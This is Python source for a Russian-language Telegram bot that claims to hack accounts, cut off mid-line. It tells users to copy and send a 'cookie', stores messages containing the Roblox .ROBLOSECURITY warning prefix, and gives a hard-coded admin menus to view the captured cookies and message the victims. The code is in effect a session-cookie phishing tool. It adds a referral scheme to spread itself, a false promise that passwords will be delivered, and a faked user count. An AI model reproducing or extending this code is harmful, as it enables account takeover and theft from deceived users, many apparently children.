from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import json
import os
from datetime import datetime, timedelta
import hashlib

# ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
BOT_TOKEN = os.getenv("BOT_TOKEN")

# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА (ТОЛЬКО ТЫ ВИДИШЬ АДМИНСКИЕ КНОПКИ)
YOUR_USER_ID = 1341594703

# ===================================================
# ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
# ===================================================

MESSAGES_FILE = "messages.json"
KEYWORD_USERS_FILE = "keyword_users.json"
ALL_USERS_FILE = "all_users.json"
ATTEMPTS_FILE = "attempts.json"
REFERRALS_FILE = "referrals.json"

KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ И РЕФЕРАЛАМИ
# ===================================================

def get_user_attempts(user_id):
    """Получает количество оставшихся попыток у пользователя"""
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                attempts = json.load(f)
            return attempts.get(str(user_id), 3)  # По умолчанию 3 попытки
        return 3
    except:
        return 3

def set_user_attempts(user_id, attempts_count):
    """Устанавливает количество попыток пользователя"""
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                attempts = json.load(f)
        else:
            attempts = {}
        
        attempts[str(user_id)] = attempts_count
        
        with open(ATTEMPTS_FILE, "w", encoding="utf-8") as f:
            json.dump(attempts, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"Ошибка сохранения попыток: {e}")
        return False

def use_attempt(user_id):
    """Использует одну попытку, возвращает True если успешно, False если попыток нет"""
    current = get_user_attempts(user_id)
    if current <= 0:
        return False
    
    set_user_attempts(user_id, current - 1)
    return True

def get_user_referrals(user_id):
    """Получает список приглашенных пользователей"""
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                referrals = json.load(f)
            return referrals.get(str(user_id), [])
        return []
    except:
        return []

def add_referral(user_id, referred_user_id):
    """Добавляет приглашенного пользователя"""
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                referrals = json.load(f)
        else:
            referrals = {}
        
        user_id_str = str(user_id)
        referred_str = str(referred_user_id)
        
        if user_id_str not in referrals:
            referrals[user_id_str] = []
        
        # Проверяем, не приглашал ли уже этого пользователя
        if referred_str not in referrals[user_id_str]:
            referrals[user_id_str].append(referred_str)
            
            # Даем +1 попытку за приглашение
            current_attempts = get_user_attempts(user_id)
            set_user_attempts(user_id, current_attempts + 1)
            
            with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
                json.dump(referrals, f, ensure_ascii=False, indent=2)
            return True
        return False
    except Exception as e:
        print(f"Ошибка добавления реферала: {e}")
        return False

def get_referral_count(user_id):
    """Получает количество приглашенных пользователей"""
    return len(get_user_referrals(user_id))

def generate_referral_link(user_id):
    """Генерирует реферальную ссылку"""
    # Создаем короткую ссылку с ID пользователя
    return f"https://t.me/{BOT_TOKEN.split(':')[0]}?start=ref_{user_id}"

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
# ===================================================

def save_all_user(user_id, username, first_name, referrer_id=None):
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        user_id_str = str(user_id)
        
        if user_id_str in users:
            users[user_id_str]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            users[user_id_str] = {
                "username": username,
                "first_name": first_name,
                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "referrer": str(referrer_id) if referrer_id else None
            }
            
            # Если есть реферер, добавляем его
            if referrer_id:
                add_referral(referrer_id, user_id)
        
        with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def get_all_users():
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_keyword_user(user_id, username, first_name):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "username": username,
            "first_name": first_name,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def is_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            return str(user_id) in users
        return False
    except:
        return False

def get_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def delete_keyword_user(user_id):
    """Удаляет пользователя из списка с ключевым словом"""
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            
            if str(user_id) in users:
                del users[str(user_id)]
                with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                    json.dump(users, f, ensure_ascii=False, indent=2)
                return True
        return False
    except Exception as e:
        print(f"Ошибка удаления пользователя: {e}")
        return False

def delete_all_keyword_users():
    """Удаляет всех пользователей из списка с ключевым словом"""
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                json.dump({}, f)
            return True
        return False
    except Exception as e:
        print(f"Ошибка удаления всех пользователей: {e}")
        return False

def get_user_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id)]
        return []
    except:
        return []

def get_keyword_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id) and KEYWORD in msg.get("text", "")]
        return []
    except:
        return []

def save_message(user_id, username, first_name, text, timestamp):
    if not is_keyword_user(user_id):
        return
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
        else:
            messages = []
        
        messages.append({
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "text": text,
            "timestamp": timestamp
        })
        
        if len(messages) > 500:
            messages = messages[-500:]
        
        with open(MESSAGES_FILE, "w", encoding="utf-8") as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения сообщения: {e}")

def get_monthly_users_count():
    """Возвращает фиксированное число 57 926"""
    return 57926

# ===================================================
# ФУНКЦИЯ ДЛЯ СОЗДАНИЯ КЛАВИАТУРЫ УДАЛЕНИЯ
# ===================================================

async def show_delete_user_menu(query, message_text=None):
    """Показывает меню выбора пользователя для удаления"""
    users = get_keyword_users()
    if not users:
        keyboard = [[InlineKeyboardButton("◀️ Назад в меню", callback_data="delete_users_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📭 Нет пользователей с ключевым словом для удаления.",
            reply_markup=reply_markup
        )
        return
    
    keyboard = []
    for user_id, user_data in users.items():
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        button_text = f"🗑 {name} (@{username})"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id}")])
    
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="delete_users_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = message_text or "🗑 **Выберите пользователя для удаления:**\n\n⚠️ ВНИМАНИЕ: Удаление нельзя отменить!"
    await query.edit_message_text(text, reply_markup=reply_markup)

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /start
# ===================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = user.first_name
    user_id = user.id
    
    # Проверяем, есть ли реферальный параметр
    referrer_id = None
    if context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].replace('ref_', ''))
            if referrer_id == user_id:
                referrer_id = None  # Нельзя пригласить самого себя
        except:
            referrer_id = None
    
    save_all_user(
        user_id=user.id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown",
        referrer_id=referrer_id
    )
    
    # Если пользователь новый, даем ему 3 попытки
    if get_user_attempts(user_id) == 3:
        # Проверяем, был ли уже пользователь в системе
        all_users = get_all_users()
        if str(user_id) not in all_users:
            set_user_attempts(user_id, 3)
    
    attempts = get_user_attempts(user_id)
    referrals = get_referral_count(user_id)
    
    # Базовые кнопки для всех
    keyboard = [
        [
            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
            InlineKeyboardButton("Инструкция", callback_data="cookies"),
        ],
        [
            InlineKeyboardButton("Поддержка", callback_data="support"),
            InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
        ]
    ]
    
    # Админские кнопки видны ТОЛЬКО ТЕБЕ
    if user_id == YOUR_USER_ID:
        keyboard.append([
            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
        ])
        keyboard.append([
            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
        ])
        keyboard.append([
            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
            InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Показываем количество попыток
    await update.message.reply_text(
        f"Привет, {user_name}! 👋\n\n"
        f"🎯 **У тебя {attempts} бесплатных попыток взлома**\n"
        f"👥 Приглашено друзей: {referrals}\n"
        f"🔑 За каждого друга +1 попытка\n\n"
        f"Выбери нужную категорию:",
        reply_markup=reply_markup
    )

# ===================================================
# ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
# ===================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    is_admin = (user_id == YOUR_USER_ID)
    data = query.data
    
    # --- РЕФЕРАЛЬНАЯ СИСТЕМА ---
    if data == "referral":
        user_id = update.effective_user.id
        referrals = get_referral_count(user_id)
        attempts = get_user_attempts(user_id)
        
        # Создаем реферальную ссылку
        bot_username = context.bot.username or "YourBot"
        referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        text = (
            f"👥 **Пригласи друга и получи +1 попытку!**\n\n"
            f"🎯 Твои попытки: {attempts}\n"
            f"👥 Приглашено друзей: {referrals}\n"
            f"🔑 За каждого друга +1 попытка\n\n"
            f"📎 **Твоя реферальная ссылка:**\n"
            f"`{referral_link}`\n\n"
            f"📋 **Как это работает:**\n"
            f"1. Отправь ссылку другу\n"
            f"2. Друг переходит по ссылке и запускает бота\n"
            f"3. Ты получаешь +1 попытку взлома\n\n"
            f"⚠️ Важно: друг должен быть новым пользователем!"
        )
        
        keyboard = [
            [InlineKeyboardButton("📋 Скопировать ссылку", callback_data="copy_referral")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        return
    
    elif data == "copy_referral":
        # Просто показываем ссылку снова
        bot_username = context.bot.username or "YourBot"
        referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        await query.edit_message_text(
            f"📎 **Твоя реферальная ссылка:**\n"
            f"`{referral_link}`\n\n"
            f"Скопируй и отправь другу! 🚀",
            parse_mode='Markdown'
        )
        return
    
    # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
    if data == "device":
        attempts = get_user_attempts(user_id)
        
        if attempts <= 0:
            keyboard = [
                [InlineKeyboardButton("👥 Пригласить друга", callback_data="referral")],
                [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **У тебя закончились попытки взлома!**\n\n"
                "Чтобы получить новую попытку, пригласи друга.\n"
                "За каждого друга ты получаешь +1 попытку! 🎁",
                reply_markup=reply_markup
            )
            return
        
        keyboard = [
            [
                InlineKeyboardButton("📱 Телефон", callback_data="phone"),
                InlineKeyboardButton("💻 Компьютер", callback_data="computer"),
            ],
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Показываем сколько осталось попыток
        await query.edit_message_text(
            f"🎯 **У тебя {attempts} попыток взлома осталось**\n\n"
            f"Выбери своё устройство:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "phone":
        # Проверяем попытки перед использованием
        if not use_attempt(user_id):
            keyboard = [
                [InlineKeyboardButton("👥 Пригласить друга", callback_data="referral")],
                [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **У тебя закончились попытки взлома!**\n\n"
                "Чтобы получить новую попытку, пригласи друга.\n"
                "За каждого друга ты получаешь +1 попытку! 🎁",
                reply_markup=reply_markup
            )
            return
        
        remaining = get_user_attempts(user_id)
        
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_phone"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/3",
            caption=f"📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.\n\n🎯 Осталось попыток: {remaining}",
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "computer":
        # Проверяем попытки перед использованием
        if not use_attempt(user_id):
            keyboard = [
                [InlineKeyboardButton("👥 Пригласить друга", callback_data="referral")],
                [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **У тебя закончились попытки взлома!**\n\n"
                "Чтобы получить новую попытку, пригласи друга.\n"
                "За каждого друга ты получаешь +1 попытку! 🎁",
                reply_markup=reply_markup
            )
            return
        
        remaining = get_user_attempts(user_id)
        
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_computer"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/4",
            caption=f"💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.\n\n🎯 Осталось попыток: {remaining}",
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
        await query.message.reply_text(
            "Скинь cookie в бота\n"
            "И бот начнет поиск пароля вашей жертвы😈\n"
            "В течении дня бот скинет вам пароль от аккаунта"
        )
        return
    
    elif data == "cookies":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "1. Зайти на профиль жертвы\n"
            "2. Скопировать cookie\n"
            "3. Вставить cookie в бота\n"
            "4. Скинуть ссылку 📌 cookie в бота\n"
            "5. Ожидать до получения пароля и логина",
            reply_markup=reply_markup
        )
        return
    
    elif data == "support":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("@H1pegold\n8:00-23:00", reply_markup=reply_markup)
        return
    
    elif data == "back_to_menu":
        user_name = update.effective_user.first_name
        user_id = update.effective_user.id
        attempts = get_user_attempts(user_id)
        referrals = get_referral_count(user_id)
        
        keyboard = [
            [
                InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
                InlineKeyboardButton("Инструкция", callback_data="cookies"),
            ],
            [
                InlineKeyboardButton("Поддержка", callback_data="support"),
                InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
            ]
        ]
        
        if user_id == YOUR_USER_ID:
            keyboard.append([
                InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
                InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
            ])
            keyboard.append([
                InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
                InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
            ])
            keyboard.append([
                InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
                InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"Привет, {user_name}! 👋\n\n"
            f"🎯 **У тебя {attempts} попыток взлома**\n"
            f"👥 Приглашено друзей: {referrals}\n"
            f"🔑 За каждого друга +1 попытка\n\n"
            f"Выбери нужную категорию:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "noop":
        await query.edit_message_text("📊 Нажмите на другую кнопку для просмотра.")
        return
    
    # --- АДМИНСКИЕ КНОПКИ ---
    if not is_admin:
        await query.edit_message_text("⚠️ Эта функция временно недоступна.")
        return
    
    # ===================================================
    # МЕНЮ УДАЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ
    # ===================================================
    
    elif data == "delete_users_menu":
        keyboard = [
            [InlineKeyboardButton("🗑 Удалить одного пользователя", callback_data="delete_single_user")],
            [InlineKeyboardButton("🗑 Удалить всех пользователей", callback_data="delete_all_users_confirm")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🗑 **Управление пользователями:**\n\n"
            "Выберите действие:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "delete_single_user":
        await show_delete_user_menu(query)
        return
    
    elif data.startswith("confirm_delete_"):
        target_user_id = data.replace("confirm_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        keyboard = [
            [InlineKeyboardButton("✅ Да, удалить", callback_data=f"execute_delete_{target_user_id}")],
            [InlineKeyboardButton("❌ Отмена", callback_data="delete_single_user")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"⚠️ **Подтверждение удаления:**\n\n"
            f"Вы уверены, что хотите удалить пользователя?\n"
            f"👤 {name} (@{username})\n"
            f"🆔 ID: {target_user_id}\n\n"
            f"🗑 Это действие нельзя отменить!",
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("execute_delete_"):
        target_user_id = data.replace("execute_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        if delete_keyword_user(target_user_id):
            await query.edit_message_text(
                f"✅ **Пользователь успешно удалён!**\n\n"
                f"👤 {name} (@{username})\n"
                f"🆔 ID: {target_user_id}\n\n"
                f"Пользователь больше не в списке с ключевым словом."
            )
            await show_delete_user_menu(query, "🗑 **Выберите следующего пользователя для удаления:**\n\n⚠️ ВНИМАНИЕ: Удаление нельзя отменить!")
        else:
            await query.edit_message_text(
                f"❌ Ошибка при удалении пользователя.\n"
                f"Возможно, он уже был удалён."
            )
        return
    
    elif data == "delete_all_users_confirm":
        keyboard = [
            [InlineKeyboardButton("⚠️ ДА, УДАЛИТЬ ВСЕХ", callback_data="execute_delete_all")],
            [InlineKeyboardButton("❌ Отмена", callback_data="delete_users_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "⚠️⚠️⚠️ **ВНИМАНИЕ!** ⚠️⚠️⚠️\n\n"
            "Вы собираетесь удалить ВСЕХ пользователей из списка с ключевым словом!\n\n"
            f"📊 Всего будет удалено: {len(get_keyword_users())} пользователей\n\n"
            "🗑 Это действие НЕЛЬЗЯ отменить!\n\n"
            "Подтвердите удаление:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "execute_delete_all":
        count = len(get_keyword_users())
        if delete_all_keyword_users():
            await query.edit_message_text(
                f"✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n"
                f"🗑 Удалено пользователей: {count}\n"
                f"📭 Список с ключевым словом теперь пуст."
            )
        else:
            await query.edit_message_text(
                f"❌ Ошибка при удалении всех пользователей."
            )
        return
    
    # Рассылка
    if data == "send_mailing":
        keyboard = [
            [InlineKeyboardButton("📨 Всем пользователям", callback_data="mailing_all")],
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="mailing_keyword")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📨 **Выберите кому отправить рассылку:**\n\n"
            "⚠️ Сообщение будет отправлено после того, как вы его напишете.",
            reply_markup=reply_markup
        )
        return
    
    # Всем пользователям
    elif data == "mailing_all":
        context.user_data['mailing_type'] = 'all'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\n"
            "Просто отправьте сообщение в этот чат.\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    # Только с ключевым словом
    elif data == "mailing_keyword":
        context.user_data['mailing_type'] = 'keyword'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\n"
            "Просто отправьте сообщение в этот чат.\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    # Все пользователи (постраничный вывод)
    elif data == "view_all_users":
        users = get_all_users()
        if not users:
            await query.edit_message_text("📭 Никто ещё не заходил в бота.")
            return
        
        context.user_data['users_list'] = list(users.items())
        context.user_data['users_page'] = 0
        context.user_data['users_per_page'] = 10
        
        await show_users_page(query, context)
        return
    
    elif data.startswith("users_page_"):
        page = int(data.replace("users_page_", ""))
        context.user_data['users_page'] = page
        await show_users_page(query, context)
        return
    
    # Только с ключевым словом (постраничный вывод)
    elif data == "view_keyword_users_only":
        users = get_keyword_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей, отправивших ключевое слово.")
            return
        
        context.user_data['keyword_users_list'] = list(users.items())
        context.user_data['keyword_users_page'] = 0
        context.user_data['keyword_users_per_page'] = 10
        
        await show_keyword_users_page(query, context)
        return
    
    elif data.startswith("keyword_users_page_"):
        page = int(data.replace("keyword_users_page_", ""))
        context.user_data['keyword_users_page'] = page
        await show_keyword_users_page(query, context)
        return
    
    # Статистика
    elif data == "view_stats":
        all_users = get_all_users()
        keyword_users = get_keyword_users()
        
        total_messages = 0
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
                total_messages = len(messages)
        
        monthly_users = get_monthly_users_count()
        
        text = "📊 **СТАТИСТИКА БОТА:**\n\n"
        text += f"👥 Всего пользователей: {len(all_users)}\n"
        text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
        text += f"📩 Сообщений сохранено: {total_messages}\n\n"
        text += f"📈 **Пользователей в месяц: 57 926**\n\n"
        
        today = datetime.now().strftime("%Y-%m-%d")
        today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
        text += f"📅 Новых сегодня: {today_count}\n"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
            [InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # Выбор пользователя для чата
    elif data == "select_user_for_chat":
        users = get_all_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей.")
            return
        
        context.user_data['chat_users_list'] = list(users.items())
        context.user_data['chat_users_page'] = 0
        context.user_data['chat_users_per_page
